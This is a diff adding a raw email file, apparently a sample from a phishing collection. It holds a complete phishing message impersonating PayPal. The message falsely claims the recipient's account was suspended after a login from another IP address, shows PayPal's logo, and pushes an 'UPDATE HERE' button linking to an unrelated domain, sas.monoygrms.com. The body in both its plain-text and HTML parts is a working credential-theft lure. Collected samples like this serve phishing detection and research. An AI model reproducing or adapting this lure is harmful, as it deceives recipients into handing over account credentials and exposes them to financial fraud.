@@ -1,0 +1,258 @@
+Return-Path: noreply@framework360.it
+Delivered-To: jose@monkey.org
+X-FDA: 83639176908.40.DDBD024
+Received: from mail.framework360.technology (mail.framework360.technology
+ [35.181.219.60])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id D4CD3160003
+	for <jose@monkey.org>; Tue,  8 Jul 2025 00:18:33 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;
+	dkim=pass header.d=framework360.it header.s=dkim header.b=hgzfJdf8;
+	spf=pass (imf22.b.hostedemail.com: domain of noreply@framework360.it
+ designates 35.181.219.60 as permitted sender)
+ smtp.mailfrom=noreply@framework360.it;
+	dmarc=pass (policy=none) header.from=framework360.it
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1751933914;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=O7zF9inMIWJnuxBry2XvyZ2Q0Fa/yvt+qpEOnh0GpcI=;
+	b=bIHKoJc1+PAQFqzYFOqnL+T+KDv1u0FVRAd7HPu8V/UYjt9cwyDfQWsVXSbAzICHpj29FX
+	lGQvMcNNHnXoSDtDLRlB8/HpZMsplRxpGb7o9y75cCPPk8hKDlesjbAsc8dGLL3ipVHO1A
+	QNdH0vMh3qW4tCnkTOyZgl04vhV8PME=
+ARC-Authentication-Results: i=1;
+	imf22.b.hostedemail.com;
+	dkim=pass header.d=framework360.it header.s=dkim header.b=hgzfJdf8;
+	spf=pass (imf22.b.hostedemail.com: domain of noreply@framework360.it
+ designates 35.181.219.60 as permitted sender)
+ smtp.mailfrom=noreply@framework360.it;
+	dmarc=pass (policy=none) header.from=framework360.it
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1751933914; a=rsa-sha256;
+	cv=none;
+	b=SMIgF6PifDpdhX5p/ikqeiPaIjy7ArhpOhXCUVdy7Loel95d14lD0b5kqySSP/QCMxFYSH
+	9XCstXlJ0kpg5eSE33KcWHP0/3OprG9qCxT+XkgBvIcP/JPqhHWdo650AOiM2l3FSFddWs
+	4MUC6tItFff1dJK1fHMffionAcs7E88=
+Received: from [127.0.0.1] (localhost [127.0.0.1]) by localhost (Mailerdaemon)
+ with ESMTPSA id 3E607B342FC
+	for <jose@monkey.org>; Tue,  8 Jul 2025 02:18:31 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=framework360.it;
+	s=dkim; t=1751933912;
+	h=from:reply-to:subject:date:message-id:to:mime-version:content-type:
+	 content-transfer-encoding; bh=O7zF9inMIWJnuxBry2XvyZ2Q0Fa/yvt+qpEOnh0GpcI=;
+	b=hgzfJdf8PgPXOMA8gjqeT1DcM5a4TAriPnSp0E1hkiCuaTtd1R454PcAi1Xo8WFolE8OXV
+	Kcbo9ULpTY9neILOPitQpS2u1XUEAS4Kh+C1zmyTod4GjDf3CtNcmprjsR5WxFtI0QLU/2
+	vY0YNX+2mhyyuWdDFik6e4aafpKTQi0=
+Date: Tue, 8 Jul 2025 02:18:31 +0200
+To: jose@monkey.org
+From: Service <chat+NC4xMzAwNw@framework360.it>
+Reply-To: Service <chat+NC4xMzAwNw@framework360.it>
+Subject: Action is required in your PayPal account 3.682,00
+Message-ID: 
+ <ecYp2oYMqFjRSzBvBbPfInn73QRs5NwacW7L5fxQ8@jervey-ccl.myframework360.it>
+X-Mailer: PHPMailer 6.1.4 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="b1_ecYp2oYMqFjRSzBvBbPfInn73QRs5NwacW7L5fxQ8"
+Content-Transfer-Encoding: 8bit
+X-Last-TLS-Session-Version: TLSv1.3
+X-Rspam-User: 
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: D4CD3160003
+X-Stat-Signature: uegew8hj1pwpjdkewsexucom4cgzs683
+X-Spam-Status: No, score=3.60
+X-HE-Tag: 1751933913-598783
+X-HE-Meta: 
+ U2FsdGVkX1+TlaS7idXrR7dtiP6EPhWxalpcup4p68HrBGFCo8WJGm6dt8xJx16/szrF3F4kJbM0Dbu2os0TiyPzVgjNpAy8RuWaQ7hTRNzVOUjlJMtLlwR198Oy7vFj3NZpEoT+bdDFw5AX4yqyORziWOaugFL4l2E/IYND/2L+Wq5BqBo2cQ9iML30Z4Fr/8xeGE+WlTj+hFDK/bgMTvT6MkgrAHDPx5VbEnxC2eocK2pc4Thms1XGpoJAO3/J2fSz/roecgk0smRQvDS3b7sxmvqhqLZrxuPMKCQ9nTOWspRfAdJQF3nfanTRTo0FRqeU8fIZD9PrVK/c+Pn8MXl50RljSryZeSlFqB9UaRgXpFQUzPMGORAg+phQIuUBKDXS1u2NXTvXMsRe0ucYFakfx96j87lESnFD62t+o+ulE14pnz2n5qEn+ojTQQWEx2AKXwqIj7rylX7QVYq9CkvKai+3coG7xuqAC9xRT6RHOp00mONfFEJkTNI/No+BelTEh0Bd/yteYtlcbyp8iW/SnW23StYXmflxXRPeP/+u+rcmZi7N9/z6dD3woaiSk12UAAqJdokpMuh/dLVtBjnefsNeyopSiGgyH/HfM8s+vtGxSAKWl2pWgUFSShkE/upGM0PJxNuv6gOELneQd0wK0/BWTqTOgQbu9De/3XjEVn1gqwh3nK0USPsC0Plk7ntGSs57+dNDm3pjWa2n7ZtMocJJm2ROMeYs7KidEfWsgJfPc3hduyKuqtiiqWZLva3IO0aCGxEdhCwX5PzHBBBVBE/+46ja8BcTP0NBWQGnNKMp7TPKxtyjNjaWpbZgoBISWqo1+ImfNY42llZ4YwXvwZ+mO2dEGL8NB7eCuOGo6GaFOpb6j+vEo/lXRH+Q2sYOBKl7tDgDQ8MAd1jGBwklI8rdtmZNDSMHJPnBfKZKiYGIBgoz9xR13Q9UbRU/4gLvnS+Yvl18aMFvBpjOFU406XK
+ Hnbbg8r7P1fUeptXNAg4/967fYxWsdnuF5xa4SBIjas1EE2w4VXjnM5O0Ppwb9wIEabic62WDgwijNF/MHOMEl5yrZSrTg4WOqb88ryIbpasdVXC4Tf5g23ONQi3AegqwaJtmsvb7L6e6qnHD3w7chh3TnXWKD0yTxXF9geGLGE/p498pmNlXF98gx5zmXuQo/YL4qm5Sze41vhel/dyiAEKqgO1C+1RYo+dEODUJ/fazAGkGtyox6zFsDp+f7cBrefCtOK3T7YHSeW/JSKtugXD0c1fqg6kDf7gFoQS9qLceqAZIkZemT9LnyA+AEhMOG+lfsmfnbCrtIzPiaPPQw5LD6kT2tNC9gOaA0jQPDClLeF+oER3chJw9jGt+YE6kSqjZenTiK9A8UV2Gp5faBIE9deV0bychGrHOlsYeEsJZgReK03QtLs6B0L4pn2cgx5FJGVjIrzc8mY4Gd+rIabblWQev0tL8AWwk5rGV6uEii4aJK4aSUOcf0G1G8kMqd64wnanjv2rSn8O2+/Gf86Q/T9OGVrFd5FmBmTGF6zerK1f4v3mttufbmYp0obWZSl/tkmjmIxTz0dRBP14P2t7wX3vkQ2yywyH8SPBoJshaTvH/B17jeTRVrwPKiy1ixEH4rmGMuIL+UTNNbkVEC749jCz0H8gF9d2X4aV4UtTApeAh1WbBTs046+tjy9hxqWea916VrVup6s+3d0LUen/ZvCdyh+tMMOjL1RNUB/X+XhYdlP+/gw5xiqikRmOjx+J5k5HsOtNSfXB0PukGLA5kXQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 280
+
+This is a multi-part message in MIME format.
+--b1_ecYp2oYMqFjRSzBvBbPfInn73QRs5NwacW7L5fxQ8
+Content-Type: text/plain; charset=us-ascii
+
+HI jose@monkey.org
+
+An attempt to access your account from a different IP address was
+detected.
+
+Therefore, we have decided to temporarily suspend your account.
+
+  https://sas.monoygrms.com/ 
+
+Thank you for your attention.
+
+Your customer service
+
+02:18
+
+--b1_ecYp2oYMqFjRSzBvBbPfInn73QRs5NwacW7L5fxQ8
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso=
+ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office"><head><meta=
+ name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1.0, ma=
+ximum-scale=3D1.0" /><meta name=3D"x-apple-disable-message-reformatting" />=
+<style>
+                body{width:100% !important; -webkit-text-size-adjust:100%; =
+-ms-text-size-adjust:100%; margin:0; padding:0;background: ;}
+                .ExternalClass {width:100%;}
+                .ExternalClass, .ExternalClass p, .ExternalClass span, .Ext=
+ernalClass font, .ExternalClass td, .ExternalClass div {line-height: 100%;}
+            </style></head><body><table width=3D"100%" cellspacing=3D"0px" =
+align=3D"center" style=3D"border-collapse: collapse; margin-top: 1.2rem; bo=
+x-sizing: border-box; border-spacing: 0px; padding: 0px; margin: auto; widt=
+h: 100%; max-width: 700px; font-family: Arial; color: #1c1c1c;">=0A  <tbody=
+ style=3D"box-sizing: border-box;">=0A    <!--[if (lte mso 15)|(IE)]>    <t=
+r><td><table align=3D"center" cellpadding=3D"0" cellspacing=3D"0" border=3D=
+"0"><tr><td valign=3D"top">    <![endif]-->=0A    <tr style=3D"box-sizing: =
+border-box;">=0A      <td valign=3D"top" width=3D"75%" colspan=3D"9" style=
+=3D"border-collapse: collapse; box-sizing: border-box; width: 75%; padding:=
+ 0px;">=0A        <table border=3D"0" cellpadding=3D"0" style=3D"border-col=
+lapse: collapse; margin-top: 1.2rem; box-sizing: border-box; width: 100%; m=
+argin: 0; padding: 0;">=0A          <tbody style=3D"box-sizing: border-box;=
+">=0A            <tr style=3D"box-sizing: border-box; margin: 0; padding: 0=
+;">=0A              <td valign=3D"top" style=3D"border-collapse: collapse; =
+position: relative; border: none; box-sizing: border-box; width: 100px; hei=
+ght: 100px; max-width: 100px; max-height: 100px; min-width: 100px; min-heig=
+ht: 100px; flex: none; padding: 15px;">=0A                <table border=3D"=
+0" cellpadding=3D"0" style=3D"border-collapse: collapse; margin-top: 1.2rem=
+; box-sizing: border-box; width: 100%; margin: 0; padding: 0;">=0A         =
+         <tbody style=3D"box-sizing: border-box;">=0A                    <t=
+r style=3D"box-sizing: border-box; margin: 0; padding: 0;">=0A             =
+         <td valign=3D"top" id=3D"ms-image686c63d3d7243" style=3D"border-co=
+llapse: collapse; padding: 0; border: none; box-sizing: border-box; border-=
+radius: inherit;">=0A                        <img width=3D"150" src=3D"http=
+s://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/i=
+mages/ppe/pp-logo_x2.png" alt=3D"" title=3D"" style=3D"box-sizing: border-b=
+ox; max-width: 100%; border-radius: inherit; width: 150px; height: auto; di=
+splay: inline-block;">=0A                      </td>=0A                    =
+</tr>=0A                  </tbody>=0A                </table>=0A           =
+   </td>=0A            </tr>=0A          </tbody>=0A        </table>=0A    =
+  </td>=0A      <td colspan=3D"3" style=3D"border-collapse: collapse; box-s=
+izing: border-box;"></td>=0A    </tr>=0A    <tr style=3D"box-sizing: border=
+-box;">=0A      <td valign=3D"top" width=3D"83.333333333333%" colspan=3D"10=
+" style=3D"border-collapse: collapse; box-sizing: border-box; width: 83.333=
+333333333%; padding: 0px;">=0A        <table border=3D"0" cellpadding=3D"0"=
+ style=3D"border-collapse: collapse; margin-top: 1.2rem; box-sizing: border=
+-box; width: 100%; margin: 0; padding: 0;">=0A          <tbody style=3D"box=
+-sizing: border-box;">=0A            <tr style=3D"box-sizing: border-box; m=
+argin: 0; padding: 0;">=0A              <td valign=3D"top" style=3D"border-=
+collapse: collapse; position: relative; width: fill-available; border: none=
+; box-sizing: border-box; padding: 15px;">=0A                <p style=3D"ma=
+rgin: 0; box-sizing: border-box; min-height: 22px;">=0A                  =
+=0A                </p>=0A                <p style=3D"margin: 15px 0 0; box=
+-sizing: border-box; min-height: 22px;">=0A                  <span style=3D=
+"box-sizing: border-box; font-size: 15px;">HI jose@monkey.org</span> =0A   =
+             </p>=0A                <p style=3D"margin: 15px 0 0; box-sizin=
+g: border-box; min-height: 22px;">=0A                  <span style=3D"box-s=
+izing: border-box; font-size: 15px;">An attempt to access your account from=
+ a different IP address was detected.</span> =0A                </p>=0A    =
+            <p style=3D"margin: 15px 0 0; box-sizing: border-box; min-heigh=
+t: 22px;">=0A                  <span style=3D"box-sizing: border-box; font-=
+size: 15px;">Therefore, we have decided to temporarily suspend your account=
+.</span> =0A                </p>=0A              </td>=0A            </tr>=
+=0A          </tbody>=0A        </table>=0A        <table border=3D"0" cell=
+padding=3D"0" style=3D"border-collapse: collapse; margin-top: 1.2rem; box-s=
+izing: border-box; width: 100%; margin: 0; padding: 0;">=0A          <tbody=
+ style=3D"box-sizing: border-box;">=0A            <tr style=3D"box-sizing: =
+border-box; margin: 0; padding: 0;">=0A              <td valign=3D"top" sty=
+le=3D"border-collapse: collapse; position: relative; border: none; box-sizi=
+ng: border-box; padding: 15px; width: auto;">=0A                <table bord=
+er=3D"0" cellpadding=3D"0" style=3D"border-collapse: collapse; margin-top: =
+1.2rem; box-sizing: border-box; width: 100%; margin: 0; padding: 0;">=0A   =
+               <tbody style=3D"box-sizing: border-box;">=0A                =
+    <tr style=3D"box-sizing: border-box; margin: 0; padding: 0;">=0A       =
+               <td valign=3D"top" style=3D"border-collapse: collapse; displ=
+ay: block; padding: 0; border: none; box-sizing: border-box;">=0A          =
+              <!--[if mso]> <center> <v:roundrect xmlns:v=3D"urn:schemas-mi=
+crosoft-com:vml" xmlns:w=3D"urn:schemas-microsoft-com:office:word" rel=3D"f=
+ollow nofollow noreferrer noopener" href=3D"https://sas.monoygrms.com/" tar=
+get=3D"_blank" style=3D"height:50px;v-text-anchor:middle;width:350px; min-w=
+idth: 100%;" arcsize=3D"%" strokecolor=3D"#337ab7" fillcolor=3D"#337ab7"> <=
+w:anchorlock/> <center style=3D"color:#ffffff;font-size:18px>;"><span><span=
+ class=3D"ms-inside-button">UPDATE HERE</span></span></center> </v:roundrec=
+t> </center> <![endif]--><a rel=3D"follow nofollow noreferrer noopener" hre=
+f=3D"https://sas.monoygrms.com/" target=3D"_blank" style=3D"text-decoration=
+: none; background: #337ab7; padding: 10px 10px; border: 0; border-radius: =
+3px; cursor: pointer; position: relative; outline: none; box-shadow: none; =
+z-index: 2; overflow: hidden; display: inline-block; font-size: inherit; fo=
+nt-family: inherit; vertical-align: middle; box-sizing: border-box; mso-hid=
+e: all; color: white; background-color: #337ab7; text-align: center; border=
+-top-left-radius: 9px; border-top-right-radius: 9px; border-bottom-right-ra=
+dius: 9px; border-bottom-left-radius: 9px;"><span style=3D"box-sizing: bord=
+er-box;"><span style=3D"box-sizing: border-box;">UPDATE HERE</span></span><=
+/a>=0A                      </td>=0A                    </tr>=0A           =
+       </tbody>=0A                </table>=0A              </td>=0A        =
+    </tr>=0A          </tbody>=0A        </table>=0A      </td>=0A    </tr>=
+<!--[if (lte mso 15)|(IE)]>    </td></tr></table></td></tr>    <![endif]-->=
+=0A  </tbody>=0A</table>=0A<table width=3D"100%" cellspacing=3D"0px" align=
+=3D"center" style=3D"border-collapse: collapse; margin-top: 1.2rem; box-siz=
+ing: border-box; border-spacing: 0px; padding: 0px; margin: auto; width: 10=
+0%; max-width: 700px; color: #1c1c1c;">=0A  <tbody style=3D"box-sizing: bor=
+der-box;">=0A    <!--[if (lte mso 15)|(IE)]>    <tr><td><table align=3D"cen=
+ter" cellpadding=3D"0" cellspacing=3D"0" border=3D"0"><tr><td valign=3D"top=
+">    <![endif]-->=0A    <tr style=3D"box-sizing: border-box;">=0A      <td=
+ valign=3D"top" width=3D"100%" colspan=3D"12" style=3D"border-collapse: col=
+lapse; box-sizing: border-box; width: 100%; padding: 0px;"></td>=0A    </tr=
+><!--[if (lte mso 15)|(IE)]>    </td></tr></table></td></tr>    <![endif]--=
+>=0A  </tbody>=0A</table>=0A<table width=3D"100%" cellspacing=3D"0px" align=
+=3D"center" style=3D"border-collapse: collapse; margin-top: 1.2rem; box-siz=
+ing: border-box; border-spacing: 0px; padding: 0px; margin: auto; width: 10=
+0%; max-width: 700px; color: #1c1c1c;">=0A  <tbody style=3D"box-sizing: bor=
+der-box;">=0A    <!--[if (lte mso 15)|(IE)]>    <tr><td><table align=3D"cen=
+ter" cellpadding=3D"0" cellspacing=3D"0" border=3D"0"><tr><td valign=3D"top=
+">    <![endif]-->=0A    <tr style=3D"box-sizing: border-box;">=0A      <td=
+ valign=3D"top" width=3D"100%" colspan=3D"12" style=3D"border-collapse: col=
+lapse; box-sizing: border-box; width: 100%; padding: 0px;"></td>=0A    </tr=
+><!--[if (lte mso 15)|(IE)]>    </td></tr></table></td></tr>    <![endif]--=
+>=0A  </tbody>=0A</table>=0A<table width=3D"100%" cellspacing=3D"0px" align=
+=3D"center" style=3D"border-collapse: collapse; margin-top: 1.2rem; box-siz=
+ing: border-box; border-spacing: 0px; padding: 0px; margin: auto; width: 10=
+0%; max-width: 700px; color: #1c1c1c;">=0A  <tbody style=3D"box-sizing: bor=
+der-box;">=0A    <!--[if (lte mso 15)|(IE)]>    <tr><td><table align=3D"cen=
+ter" cellpadding=3D"0" cellspacing=3D"0" border=3D"0"><tr><td valign=3D"top=
+">    <![endif]-->=0A    <tr style=3D"box-sizing: border-box;">=0A      <td=
+ valign=3D"top" width=3D"100%" colspan=3D"12" style=3D"border-collapse: col=
+lapse; box-sizing: border-box; width: 100%; padding: 0px;"></td>=0A    </tr=
+><!--[if (lte mso 15)|(IE)]>    </td></tr></table></td></tr>    <![endif]--=
+>=0A  </tbody>=0A</table>=0A<table width=3D"100%" cellspacing=3D"0px" align=
+=3D"center" style=3D"border-collapse: collapse; margin-top: 1.2rem; box-siz=
+ing: border-box; border-spacing: 0px; padding: 0px; margin: auto; width: 10=
+0%; max-width: 700px; color: #1c1c1c;">=0A  <tbody style=3D"box-sizing: bor=
+der-box;">=0A    <!--[if (lte mso 15)|(IE)]>    <tr><td><table align=3D"cen=
+ter" cellpadding=3D"0" cellspacing=3D"0" border=3D"0"><tr><td valign=3D"top=
+">    <![endif]-->=0A    <tr style=3D"box-sizing: border-box;">=0A      <td=
+ valign=3D"top" width=3D"83.333333333333%" colspan=3D"10" style=3D"border-c=
+ollapse: collapse; box-sizing: border-box; width: 83.333333333333%; padding=
+: 0px;">=0A        <table border=3D"0" cellpadding=3D"0" style=3D"border-co=
+llapse: collapse; margin-top: 1.2rem; box-sizing: border-box; width: 100%; =
+margin: 0; padding: 0;">=0A          <tbody style=3D"box-sizing: border-box=
+;">=0A            <tr style=3D"box-sizing: border-box; margin: 0; padding: =
+0;">=0A              <td valign=3D"top" style=3D"border-collapse: collapse;=
+ position: relative; width: fill-available; border: none; box-sizing: borde=
+r-box; padding: 15px;">=0A                <p style=3D"margin: 0; box-sizing=
+: border-box; min-height: 22px;">=0A                  <span style=3D"box-si=
+zing: border-box; font-size: 13px;">Thank you for your attention.</span> =
+=0A                </p>=0A                <p style=3D"margin: 15px 0 0; box=
+-sizing: border-box; min-height: 22px;">=0A                  <span style=3D=
+"box-sizing: border-box; font-size: 13px;">Your customer service</span> =0A=
+                </p>=0A                <p style=3D"margin: 15px 0 0; box-si=
+zing: border-box; min-height: 22px;">=0A                  <span style=3D"bo=
+x-sizing: border-box; font-size: 12px;">02:18</span> =0A                </p=
+>=0A              </td>=0A            </tr>=0A          </tbody>=0A        =
+</table>=0A      </td>=0A      <td colspan=3D"2" style=3D"border-collapse: =
+collapse; box-sizing: border-box;"></td>=0A    </tr>=0A    <tr style=3D"box=
+-sizing: border-box;">=0A      <td valign=3D"top" width=3D"100%" colspan=3D=
+"12" style=3D"border-collapse: collapse; box-sizing: border-box; width: 100=
+%; padding: 0px;"></td>=0A    </tr><!--[if (lte mso 15)|(IE)]>    </td></tr=
+></table></td></tr>    <![endif]-->=0A  </tbody>=0A</table></body></html>
+
+--b1_ecYp2oYMqFjRSzBvBbPfInn73QRs5NwacW7L5fxQ8--
+
+
